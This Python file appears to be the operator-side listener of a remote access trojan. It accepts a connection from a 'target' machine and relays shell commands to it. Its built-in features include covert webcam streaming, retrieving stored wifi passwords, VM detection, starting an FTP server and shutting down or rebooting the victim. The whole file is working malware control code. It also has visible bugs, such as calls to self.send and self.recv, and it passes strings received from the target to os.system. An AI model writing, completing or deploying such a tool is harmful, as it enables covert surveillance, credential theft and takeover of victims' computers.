import socket
import socks
import os
import sys
import platform
import cv2
import struct
import pickle
import time

from termcolor import colored

class Server:

	warning = colored("[-]", 'red')
	plus = colored("[+]", "blue")
	star = colored("[*]", 'blue')

	def __init__(self):
		self.host = str(input(colored('set host > ', 'red')))
		self.port = int(input(colored('set port > ', 'red')))
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.format = "UTF-8"
	
	@staticmethod
	def clear_screen():
		if platform.system() == "windows":
			os.system('cls')
		elif platform.system() == "Linux":
			os.system("clear")

	@staticmethod
	def help():
		print("""
* clear/cls: clear screen
* cd: change directory
* hardware --check: check target machine hardware
* vm --check: (virtual machine) Check if the system is running on a virtual machine
* vc --start: (video capture) webcam stream
* ftp --start: start ftp server
* shutdown: turnoff the target machine
* reboot: reboot the target machine
* profiles: get wifi passwords
* exit/close/reset/quit: close the server only
# the session will not be lost if you run close or exit or quit, you will close the server only

""")

	def start(self):
		try :
			self.sock.bind((self.host, self.port))
			self.sock.listen(1)
			print("{} Listening for incoming connections on {}:{}".format(Server.star, self.host, self.port))
		except Exception as e:
			print(colored(f"Error Occurred : {e}", 'red'))
			sys.exit(1)
		try:
			self.target, self.ip = self.sock.accept()
			print("{} Accepted connection from {}".format(Server.plus, self.ip))
		except Exception as e:
			print(colored(f"Error Occurred : {e}", 'red'))
			sys.exit(1)

	def open_shell(self):
		print("\n{} target connected at {}".format(Server.star, time.asctime()))
		TE = colored("server", 'red')
		while True:
			command = input("\n{}@{}:~$ ".format(TE, colored(self.ip[0], 'light_blue')))
			if len(command) >1:
				self.target.send(command.encode(self.format))
				if command=="clear" or command=='cls':
					Server.clear_screen()
				elif command[:3] == "cd":
					print(self.target.recv(1024).decode(self.format))
				elif command == "hardware --check":
					print(self.target.recv(1024).decode(self.format))
				elif command == "vm --check":
					print(self.target.recv(1024).decode(self.format))
				elif command == "vc --start":
					try:
						data = b""
						payload_size = struct.calcsize("L")
						while True:
							while len(data) < payload_size:
								data += self.target.recv(4096)

							packed_msg_size = data[:payload_size]
							data = data[payload_size:]
							msg_size = struct.unpack("L", packed_msg_size)[0]

							while len(data) < msg_size:
								data += self.target.recv(4096)

							frame_data = data[:msg_size]
							data = data[msg_size:]

							frame = pickle.loads(frame_data)
							cv2.imshow('LIVE', frame)
							if cv2.waitKey(1) == ord('q'):
								break

						cv2.destroyAllWindows()
					except Exception:
						sys.exit()
				elif command == "ftp --start":
					ftp_session = self.target.recv(1024).decode(self.format)
					print(colored(ftp_session, 'green'))
				elif command=="exit" or command=="quit" or command=="close":
					self.send('exit'.encode(self.format))
					os.system(self.target.recv(1024).decode(self.format))
				elif command == "reset":
					self.target.send("reset".encode(self.format))
					os.system(self.recv(1024).decode(self.format))
				elif command == 'profiles':
					passwords = self.target.recv(1024).decode(self.format)
					print(passwords)
				elif command=="shutdown" or command=="power off":
					pass
				elif command=="reboot" or command=="restart":
					pass
				elif command == "help":
					Server.help()
				
				else:
					packet = self.target.recv(1024).decode(self.format)
					print(packet)

if __name__ == '__main__':
	listener = Server()
	listener.clear_screen()
	listener.start()
	listener.open_shell()
